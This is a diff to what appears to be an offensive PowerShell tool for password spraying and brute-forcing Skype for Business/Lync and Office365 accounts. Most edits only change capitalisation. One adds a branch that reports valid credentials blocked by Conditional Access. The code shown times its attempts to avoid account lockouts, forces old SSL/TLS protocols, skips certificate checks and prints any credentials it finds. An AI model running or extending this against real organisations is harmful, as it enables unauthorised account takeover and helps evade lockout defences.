@@ -53,7 +53,7 @@ function Invoke-GetAutoDiscoverURL
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
     $domain = $Username.split("@")[1]
     $lyncurl = "https://lyncdiscover.$($domain)"
-    write-verbose "[*] Using autodiscover URL of $($lyncurl)"
+    Write-Verbose "[*] Using autodiscover URL of $($lyncurl)"
     $data = Invoke-WebRequest -Insecure -Uri $lyncurl -Method GET -ContentType "application/json" -UseBasicParsing
 
     if($data)
@@ -128,7 +128,7 @@ function Invoke-LyncSpray
 
   if ($AutoDiscoverURL)
   {
-    write-host "[*] Retrieving S4B AutoDiscover Information"
+    Write-Host "[*] Retrieving S4B AutoDiscover Information"
     try{
       $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
       [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
@@ -147,7 +147,7 @@ function Invoke-LyncSpray
           {
             $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
             $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
-            write-host $data
+            Write-Host $data
             $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
           }
           else
@@ -171,7 +171,7 @@ function Invoke-LyncSpray
 
   if($baseurl -match "online.lync.com" -And (-Not ($Office365)))
   {
-    write-host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
+    Write-Host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
   }
   ForEach($Username in $Usernames)
   {
@@ -256,7 +256,7 @@ function Invoke-LyncBrute
 
   if ($AutoDiscoverURL)
   {
-    write-host "[*] Retrieving S4B AutoDiscover Information"
+    Write-Host "[*] Retrieving S4B AutoDiscover Information"
     try{
       $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
       [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
@@ -275,7 +275,7 @@ function Invoke-LyncBrute
           {
             $s4bAutodiscover = (($data.content | ConvertFrom-JSON)._links.redirect.href)
             $data = Invoke-WebRequest -Insecure -Uri $s4bAutodiscover -Method GET -ContentType "application/json" -UseBasicParsing
-            write-host $data
+            Write-Host $data
             $baseurl = (($data.content | ConvertFrom-JSON)._links.user.href).split("/")[0..2] -join "/"
           }
           else
@@ -299,7 +299,7 @@ function Invoke-LyncBrute
 
   if($baseurl -match "online.lync.com" -And (-Not ($Office365)))
   {
-    write-host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
+    Write-Host -foreground "red" "[*] Domain appears to be Office365, apply -Office365 flag"
   }
 
   Write-Host -foreground "blue" "[*] Commencing bruteforce at $(Get-Date)"
@@ -317,7 +317,7 @@ function Invoke-LyncBrute
       if($counter -ge 10)
       {
         Write-Host -foreground "blue" "[*] Current time $(Get-Date)"
-        write-host -foreground "red" "[*] Sleeping for $($delay) seconds"
+        Write-Host -foreground "red" "[*] Sleeping for $($delay) seconds"
         # sleep for 60 then an ever increasing amount between attempts :(
         # behaviour is o365 specific but had most success in this config
         sleep $delay;
@@ -338,7 +338,7 @@ function Invoke-LyncBrute
           $TimeDelay = 300
         }
         Write-Host -foreground "blue" "[*] Current time $(Get-Date)"
-        write-host -foreground "red" "[*] Sleeping for $($TimeDelay) seconds"
+        Write-Host -foreground "red" "[*] Sleeping for $($TimeDelay) seconds"
         # sleep for 60 every 3 attempts - may need adjusting to avoid lockouts
         sleep $TimeDelay;
         $counter=1;
@@ -403,7 +403,7 @@ function Invoke-Authenticate
     Write-Verbose "[*] Invalid credentials: $($Username):$($Password)   ($($_.Exception.GetType().FullName) - $($_.Exception.Message))"
     return
   }
-  write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
+  Write-Host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
 }
 
 function Invoke-AuthenticateO365
@@ -499,15 +499,19 @@ function Invoke-AuthenticateO365
     $BinarySecurityToken = $data.Envelope.Body.RequestSecurityTokenResponse.RequestedSecurityToken.BinarySecurityToken.InnerText
     if ($data.OuterXml.Contains("you must use multi-factor"))
     {
-      write-host -ForegroundColor "green" "[*] Found Credentials: $($Username):$($Password) However, MFA is required."
+      Write-Host -ForegroundColor "green" "[*] Found Credentials: $($Username):$($Password) However, MFA is required."
+    }
+    elseif ($data.OuterXml.Contains("Access has been blocked by Conditional Access policies"))
+    {
+      Write-Host -ForegroundColor "green" "[*] Found Credentials: $($Username):$($Password) However, access has been blocked by Conditional Access policies."
     }
     elseif($data.OuterXml.Contains("Error validating credentials"))
     {
         Write-Verbose "[*] Invalid credentials: $($Username):$($Password)"
     }
-    ElseIf($BinarySecurityToken)
+    elseif($BinarySecurityToken)
     {
-      write-host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
+      Write-Host -foreground "green" "[*] Found credentials: $($Username):$($Password)"
     }
     else
     {
